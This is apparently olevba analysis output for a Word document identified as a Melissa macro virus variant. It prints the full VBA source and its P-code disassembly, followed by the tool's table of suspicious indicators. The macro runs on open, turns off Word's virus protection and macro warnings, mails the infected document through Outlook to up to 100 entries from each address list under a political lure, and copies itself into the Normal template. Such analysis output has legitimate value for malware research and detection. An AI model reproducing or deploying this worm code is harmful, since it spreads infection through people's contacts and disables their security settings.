olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO x.cls 
in file: Virus.MSWord.Melissa.bd - OLE stream: 'Macros/VBA/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
a$ = ""
hk1$ = "HKEY_CURRENT_USER"
sec1$ = "Security"
    Set prevDocument = ActiveDocument
    Set nextDocument = NormalTemplate
c$ = "Level"
d$ = sec1$ + "..."
e$ = "Macro"
g$ = "Tools"
ot1$ = "Outlook"
h$ = ot1$ + ".Application"
k$ = hk1$ + smo$ + "\"
nam$ = "x"
I$ = nam$ + "?"
aut$ = "y"
j$ = "MAPI"
l$ = "profile"
m$ = "password"
n$ = "Duhalde Presidente "
o$ = "Programa de gobierno 1999 - 2004."
p$ = hk1$ + smo$ + "\"
q$ = "Private Sub Document_Close()"
r$ = "Private Sub Document_Open()"
s$ = "Document"
t$ = " "
On Error Resume Next
If System.PrivateProfileString(a$, b$, c$) <> a$ Then
CommandBars(e$).Controls(d$).Enabled = False
System.PrivateProfileString(a$, b$, c$) = 1&
Else
CommandBars(g$).Controls(e$).Enabled = False
Options.ConfirmConversions = (3 - 3): Options.VirusProtection = (3 - 3): Options.SaveNormalPrompt = (3 - 3)
End If
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject(h$)
Set DasMapiName = UngaDasOutlook.GetNameSpace(j$)
If System.PrivateProfileString(a$, k$, I$) <> aut$ Then
If UngaDasOutlook = ot1$ Then
DasMapiName.Logon l$, m$
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x1 = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x1)
            BreakUmOffASlice.Recipients.Add Peep
            x1 = x1 + 1
            If x1 > 100 Then oo = AddyBook.AddressEntries.Count
         Next oo
         BreakUmOffASlice.Subject = n$ & Application.UserName
         BreakUmOffASlice.Body = o$
         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
         BreakUmOffASlice.Send
         Peep = a$
    Next y
DasMapiName.Logoff
End If
System.PrivateProfileString(a$, p$, I$) = aut$
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> nam$ Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToI = ADI1
ADI1.Name = nam$
DoAD = True
End If
If NTI1.Name <> nam$ Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToI = NTI1
NTI1.Name = nam$
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = a$
ADI1.CodeModule.DeleteLines 1
Loop
ToI.CodeModule.AddFromString (q$)
Do While ADI1.CodeModule.Lines(BGN, 1) <> a$
ToI.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = a$
NTI1.CodeModule.DeleteLines 1
Loop
ToI.CodeModule.AddFromString (r$)
Do While NTI1.CodeModule.Lines(BGN, 1) <> a$
ToI.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, s$) = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, s$) <> False) Then
ActiveDocument.Saved = True: End If
If (Day(Now) + 1) = (Minute(Now) + 2) Then Selection.TypeText t$
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Melissa.bd
' ===============================================================================
' Module streams:
' Macros/VBA/x - 6165 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	LitStr 0x0000 ""
' 	St a$ 
' Line #2:
' 	LitStr 0x0011 "HKEY_CURRENT_USER"
' 	St hk1$ 
' Line #3:
' 	LitStr 0x0008 "Security"
' 	St sec1$ 
' Line #4:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set prevDocument 
' Line #5:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set nextDocument 
' Line #6:
' 	LitStr 0x0005 "Level"
' 	St c$ 
' Line #7:
' 	Ld sec1$ 
' 	LitStr 0x0003 "..."
' 	Add 
' 	St d$ 
' Line #8:
' 	LitStr 0x0005 "Macro"
' 	St e$ 
' Line #9:
' 	LitStr 0x0005 "Tools"
' 	St g$ 
' Line #10:
' 	LitStr 0x0007 "Outlook"
' 	St ot1$ 
' Line #11:
' 	Ld ot1$ 
' 	LitStr 0x000C ".Application"
' 	Add 
' 	St h$ 
' Line #12:
' 	Ld hk1$ 
' 	Ld smo$ 
' 	Add 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St k$ 
' Line #13:
' 	LitStr 0x0001 "x"
' 	St nam$ 
' Line #14:
' 	Ld nam$ 
' 	LitStr 0x0001 "?"
' 	Add 
' 	St I$ 
' Line #15:
' 	LitStr 0x0001 "y"
' 	St aut$ 
' Line #16:
' 	LitStr 0x0004 "MAPI"
' 	St j$ 
' Line #17:
' 	LitStr 0x0007 "profile"
' 	St l$ 
' Line #18:
' 	LitStr 0x0008 "password"
' 	St m$ 
' Line #19:
' 	LitStr 0x0013 "Duhalde Presidente "
' 	St n$ 
' Line #20:
' 	LitStr 0x0021 "Programa de gobierno 1999 - 2004."
' 	St o$ 
' Line #21:
' 	Ld hk1$ 
' 	Ld smo$ 
' 	Add 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St p$ 
' Line #22:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	St q$ 
' Line #23:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St r$ 
' Line #24:
' 	LitStr 0x0008 "Document"
' 	St s$ 
' Line #25:
' 	LitStr 0x0001 " "
' 	St t$ 
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	Ld a$ 
' 	Ld B$ 
' 	Ld c$ 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld a$ 
' 	Ne 
' 	IfBlock 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld d$ 
' 	Ld e$ 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #29:
' 	LitDI4 0x0001 0x0000 
' 	Ld a$ 
' 	Ld B$ 
' 	Ld c$ 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #30:
' 	ElseBlock 
' Line #31:
' 	LitVarSpecial (False)
' 	Ld e$ 
' 	Ld g$ 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #32:
' 	LitDI2 0x0003 
' 	LitDI2 0x0003 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0003 
' 	LitDI2 0x0003 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0003 
' 	LitDI2 0x0003 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Dim 
' 	VarDefn UngaDasOutlook
' 	VarDefn DasMapiName
' 	VarDefn BreakUmOffASlice
' Line #35:
' 	SetStmt 
' 	Ld h$ 
' 	ArgsLd CreateObject 0x0001 
' 	Set UngaDasOutlook 
' Line #36:
' 	SetStmt 
' 	Ld j$ 
' 	Ld UngaDasOutlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set DasMapiName 
' Line #37:
' 	Ld a$ 
' 	Ld k$ 
' 	Ld I$ 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld aut$ 
' 	Ne 
' 	IfBlock 
' Line #38:
' 	Ld UngaDasOutlook 
' 	Ld ot1$ 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	Ld l$ 
' 	Ld m$ 
' 	Ld DasMapiName 
' 	ArgsMemCall Logon 0x0002 
' Line #40:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DasMapiName 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #41:
' 	SetStmt 
' 	Ld y 
' 	Ld DasMapiName 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #42:
' 	LitDI2 0x0001 
' 	St x1 
' Line #43:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld UngaDasOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set BreakUmOffASlice 
' Line #44:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #45:
' 	Ld x1 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #46:
' 	Ld Peep 
' 	Ld BreakUmOffASlice 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #47:
' 	Ld x1 
' 	LitDI2 0x0001 
' 	Add 
' 	St x1 
' Line #48:
' 	Ld x1 
' 	LitDI2 0x0064 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #49:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	Ld n$ 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #51:
' 	Ld o$ 
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #52:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld BreakUmOffASlice 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #53:
' 	Ld BreakUmOffASlice 
' 	ArgsMemCall Send 0x0000 
' Line #54:
' 	Ld a$ 
' 	St Peep 
' Line #55:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	Ld DasMapiName 
' 	ArgsMemCall Logoff 0x0000 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld aut$ 
' 	Ld a$ 
' 	Ld p$ 
' 	Ld I$ 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #61:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #62:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #63:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #64:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #65:
' 	Ld ADI1 
' 	MemLd New 
' 	Ld nam$ 
' 	Ne 
' 	IfBlock 
' Line #66:
' 	LineCont 0x0004 05 00 00 00
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #67:
' 	SetStmt 
' 	Ld ADI1 
' 	Set ToI 
' Line #68:
' 	Ld nam$ 
' 	Ld ADI1 
' 	MemSt New 
' Line #69:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	Ld NTI1 
' 	MemLd New 
' 	Ld nam$ 
' 	Ne 
' 	IfBlock 
' Line #72:
' 	LineCont 0x0004 05 00 00 00
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #73:
' 	SetStmt 
' 	Ld NTI1 
' 	Set ToI 
' Line #74:
' 	Ld nam$ 
' 	Ld NTI1 
' 	MemSt New 
' Line #75:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CYA 
' 	EndIf 
' Line #78:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #79:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld a$ 
' 	Eq 
' 	DoWhile 
' Line #80:
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #81:
' 	Loop 
' Line #82:
' 	Ld q$ 
' 	Paren 
' 	Ld ToI 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #83:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld a$ 
' 	Ne 
' 	DoWhile 
' Line #84:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToI 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #85:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #86:
' 	Loop 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #89:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld a$ 
' 	Eq 
' 	DoWhile 
' Line #90:
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #91:
' 	Loop 
' Line #92:
' 	Ld r$ 
' 	Paren 
' 	Ld ToI 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #93:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld a$ 
' 	Ne 
' 	DoWhile 
' Line #94:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToI 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #95:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #96:
' 	Loop 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	Label CYA 
' Line #99:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld s$ 
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #100:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #101:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld s$ 
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #102:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #103:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld t$ 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #104:
' 	EndSub 
' Line #105:
' Line #106:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

